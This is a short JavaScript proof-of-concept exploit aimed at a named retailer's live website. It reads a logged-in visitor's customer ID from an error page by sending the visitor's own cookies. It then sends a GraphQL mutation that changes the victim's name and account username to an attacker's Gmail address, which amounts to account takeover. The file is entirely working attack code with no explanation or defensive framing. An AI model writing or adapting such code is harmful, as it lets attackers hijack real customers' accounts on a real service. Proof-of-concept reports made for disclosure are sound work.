// Function to send a GET request with credentials
function sendGetRequest() {
  fetch("https://www.hy-vee.com/err_404.aspx", { credentials: "include" })
    .then(response => response.text())
    .then(data => {
      const regex = /let customerUuid  = '([a-f0-9-]+)'/;
      const matches = data.match(regex);
      if (matches && matches.length > 1) {
        const customerUuid = matches[1];
        sendPostRequest(customerUuid);
      } else {
        console.log("Failed to extract customerUuid from the response.");
      }
    })
    .catch(error => {
      console.log("Error occurred while sending the GET request:", error);
    });
}

// Function to send a POST request with the extracted customerUuid
function sendPostRequest(customerUuid) {
  const url = "https://www.hy-vee.com/my-account/api/graphql";
  const requestBody = [
    {
      operationName: "UpdateCustomerMutation",
      variables: {
        customerUuid: customerUuid,
        updateCustomerInput: {
          firstName: "nagap",
          lastName: "jon",
          preferredStoreId: null,
          username: "dmxjon1+nagap@gmail.com"
        }
      },
      query:
        "mutation UpdateCustomerMutation($customerUuid: String!, $updateCustomerInput: updateCustomerInput!) {\n  updateCustomer(\n    customerUuid: $customerUuid\n    updateCustomerInput: $updateCustomerInput\n  ) {\n    customerUuid\n    __typename\n  }\n}"
    }
  ];

  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(requestBody)
  })
    .then(response => {
      if (response.status === 200) {
        alert("done");
      } else {
        console.log("POST request failed with status:", response.status);
      }
    })
    .catch(error => {
      console.log("Error occurred while sending the POST request:", error);
    });
}

// Start the process
sendGetRequest();
